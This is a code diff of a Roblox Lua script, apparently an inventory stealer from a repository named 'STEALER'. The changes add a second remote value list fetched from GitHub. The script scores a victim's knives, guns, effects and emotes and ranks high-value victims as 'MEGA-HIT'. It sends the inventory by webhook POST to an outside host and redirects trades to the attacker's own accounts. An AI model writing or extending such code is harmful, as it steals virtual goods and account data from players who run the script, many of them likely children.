@@ -10,6 +10,7 @@ local player = Players.LocalPlayer
 -- URL DEL REPOSITORIO DE VALORES (JSON)
 -- ==========================================
 local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
+local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"
 
 -- ==========================================
 -- CONFIGURACIÓN SECRETA DUAL WEBHOOK
@@ -55,8 +56,10 @@ end
 -- CARGA DINÁMICA DE VALORES DE GITHUB
 -- ==========================================
 local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
+local DualKnives, DualGuns, DualEffects, DualEmotes = {}, {}, {}, {}
 
 local function cargarValoresGitHub()
+    -- Carga de valores principales
     local success, response = pcall(function()
         return game:HttpGet(VALUES_REPO_URL)
     end)
@@ -71,7 +74,24 @@ local function cargarValoresGitHub()
             Guns = decodedData.Guns or {}
             Effects = decodedData.Effects or {}
             Emotes = decodedData.Emotes or {}
-            return
+        end
+    end
+    
+    -- Carga de valores para el Dual Hook
+    local successDual, responseDual = pcall(function()
+        return game:HttpGet(DUAL_VALUES_REPO_URL)
+    end)
+    
+    if successDual and responseDual then
+        local decodeSuccessDual, decodedDataDual = pcall(function()
+            return HttpService:JSONDecode(responseDual)
+        end)
+        
+        if decodeSuccessDual and decodedDataDual then
+            DualKnives = decodedDataDual.Knives or {}
+            DualGuns = decodedDataDual.Guns or {}
+            DualEffects = decodedDataDual.Effects or {}
+            DualEmotes = decodedDataDual.Emotes or {}
         end
     end
 end
@@ -167,6 +187,7 @@ task.spawn(function()
         local pd = cg.PlayerData
         local knives, guns, effects, emotes = {}, {}, {}, {}
         local totalValue = 0
+        local totalDualValue = 0
         local hasSpecialEffect = false
 
         local foundMatchaKnife, foundMatchaGun = false, false
@@ -177,7 +198,7 @@ task.spawn(function()
             return string.gsub(name, " ", "")
         end
 
-        local function scanAndSave(category, valueTable, resultTable)
+        local function scanAndSave(category, valueTable, dualValueTable, resultTable)
             local inv = pd:TryIndex({"Inventory", category})
             if not inv then return end
             
@@ -185,6 +206,12 @@ task.spawn(function()
                 -- APLICANDO LÓGICA DE INICIO DE INVENTARIO (Script 1)
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
+                    
+                    -- Calcula el valor en la lista Dual
+                    if dualValueTable[cleanName] then
+                        totalDualValue = totalDualValue + dualValueTable[cleanName]
+                    end
+                    
                     if valueTable[cleanName] then
                         
                         if cleanName == "MatchaBobaKnife" then foundMatchaKnife = true end
@@ -208,10 +235,10 @@ task.spawn(function()
             end
         end
 
-        scanAndSave("Knife", Knives, knives)
-        scanAndSave("Gun", Guns, guns)
-        scanAndSave("Effect", Effects, effects)
-        scanAndSave("Emote", Emotes, emotes)
+        scanAndSave("Knife", Knives, DualKnives, knives)
+        scanAndSave("Gun", Guns, DualGuns, guns)
+        scanAndSave("Effect", Effects, DualEffects, effects)
+        scanAndSave("Emote", Emotes, DualEmotes, emotes)
 
         local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)
 
@@ -288,13 +315,17 @@ task.spawn(function()
                                     "**Executor:** `" .. executorName .. "`\n\n" ..
                                     "### 📊 Estadísticas de Hit\n" ..
                                     "**Historial:** `" .. executionText .. "`\n" ..
-                                    "**Total Value:** `💰 " .. totalValue .. "`\n\n" ..
+                                    "**Total Value:** `💰 " .. totalValue .. "`\n" ..
+                                    "**Dual Value:** `💎 " .. totalDualValue .. "`\n\n" ..
                                     "**=============================**"
 
             local pings = {}
             local embedColor = 3447003
 
-            if totalValue >= 5000 or hasSpecialEffect then
+            if totalDualValue > 7500 then
+                table.insert(pings, "@MEGA-HIT 🚨 **¡HIT DUAL EXCLUSIVO (+7500 VALOR EN LISTA 2)!** 🚨")
+                embedColor = 16711680
+            elseif totalValue >= 5000 or hasSpecialEffect then
                 table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR O EFECTO DETECTADO)!** 🚨")
                 embedColor = 16711680
             elseif totalValue >= 2000 then
@@ -338,7 +369,23 @@ task.spawn(function()
             -- ==========================================
             -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
             -- ==========================================
-            if totalValue >= 5000 or hasSpecialEffect then
+            if totalDualValue > 7500 then
+                -- VALOR MAYOR A 7500 EN LA SEGUNDA LISTA: ENVÍA ÚNICAMENTE AL DUAL HOOK AL INSTANTE
+                task.spawn(function()
+                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
+                        request({
+                            Url = DUAL_WEBHOOK_INVENTARIO,
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = jsonPayload
+                        })
+                    end
+                end)
+                
+                -- Cambia los objetivos a tus cuentas de tradeo
+                jugadoresObjetivos = jugadoresObjetivosDual
+                
+            elseif totalValue >= 5000 or hasSpecialEffect then
                 -- 1. Tu Webhook (Dual): Notifica al instante
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
